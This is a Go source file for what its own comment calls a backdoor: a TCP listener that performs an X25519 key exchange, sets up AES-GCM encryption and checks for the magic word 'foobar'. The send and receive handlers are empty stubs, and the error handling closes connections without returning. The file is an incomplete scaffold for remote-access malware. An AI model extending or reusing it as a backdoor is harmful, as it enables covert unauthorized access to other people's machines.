package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"fmt"
	"net"
	"os"
)

func sendThread() {

}

func recvThread() {

}

// Handles initial connection from a client to this backdoor
func handleConnection(conn net.Conn) {
	fmt.Printf("Serving %s\n", conn.RemoteAddr().String())
	var priv, _ = ecdh.Curve.GenerateKey(ecdh.X25519(), rand.Reader)
	var pub = priv.PublicKey()

	// First packet sent by client is supposed to be a public key
	// of length 32
	buf := make([]byte, 1024)
	readLen, err := conn.Read(buf)
	if err != nil || readLen != 32 {
		conn.Close()
	}
	// Bytes to public key
	remote, err := ecdh.X25519().NewPublicKey(buf[:readLen])
	if err != nil {
		conn.Close()
	}

	// Send the client our public key
	writeLen, err := conn.Write(pub.Bytes())
	if err != nil || writeLen != 32 {
		conn.Close()
	}

	// Compute shared key
	shared, err := priv.ECDH(remote)
	if err != nil {
		conn.Close()
	}

	// Make a cipher
	c, _ := aes.NewCipher(shared)
	gcm, _ := cipher.NewGCM(c)

	// Check the next message is a magic word
	readLen, _ = conn.Read(buf)
	nonce := buf[:gcm.NonceSize()]
	ct := buf[gcm.NonceSize():readLen]

	pt, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		conn.Close()
	}

	if string(pt) != "foobar" {
		conn.Close()
	}

	// Start thread for listening and sending

}

const (
	CONN_HOST = "localhost"
	CONN_PORT = "3333"
	CONN_TYPE = "tcp"
)

func main() {
	// Begin listening for connections
	sock, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}
	// Close at the end of application
	fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
	defer sock.Close()

	for {
		conn, err := sock.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		// Handle connection in new goroutine
		go handleConnection(conn)
	}
}
